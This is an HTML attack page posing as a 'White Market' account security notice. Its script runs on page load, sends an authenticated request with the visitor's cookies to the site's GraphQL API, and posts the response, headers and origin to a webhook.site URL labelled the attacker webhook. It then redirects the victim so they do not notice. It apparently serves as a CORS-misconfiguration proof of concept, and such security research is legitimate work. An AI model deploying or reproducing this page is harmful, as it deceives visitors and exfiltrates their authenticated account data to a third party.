<!DOCTYPE html>
<html>
<head><title>White Market - Security Notice</title></head>
<body>
    <h1>Verifying your account...</h1>
    <div id="debug"></div>
    <script>
        function log(msg) {
            document.getElementById('debug').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        async function exploit() {
            log('Testing cookie transmission...');
            
            try {
                // Make ANY authenticated request
                // Even if it fails, we can prove the cookie was sent
                const response = await fetch('https://api.white.market/graphql/api', {
                    method: 'POST',
                    credentials: 'include', // Sends the HttpOnly cookie
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        query: "query { __typename }"
                    })
                });
                
                const responseHeaders = {};
                response.headers.forEach((value, key) => {
                    responseHeaders[key] = value;
                });
                
                const data = await response.json();
                
                // Log everything
                log('Response Status: ' + response.status);
                log('Response: ' + JSON.stringify(data));
                
                // Exfiltrate to webhook
                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        message: 'Cookie transmission successful',
                        origin: window.location.origin,
                        timestamp: new Date().toISOString(),
                        responseStatus: response.status,
                        responseHeaders: responseHeaders,
                        responseData: data,
                        proof: 'If you see a 200 response or valid GraphQL response, the cookie was sent from victim browser to apixwhite.market'
                    })
                });
                
                log('Proof sent to attacker webhook!');
                
                // Redirect victim so they don't notice
                setTimeout(() => {
                    window.location = 'https://white.market';
                }, 2000);
                
            } catch(e) {
                log('Error: ' + e.message);
                
                // Even errors can prove CORS is allowing the request
                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        error: e.message,
                        note: 'If this is NOT a CORS error, the cookie was sent successfully'
                    })
                });
            }
        }
        
        exploit();
    </script>
</body>
</html>
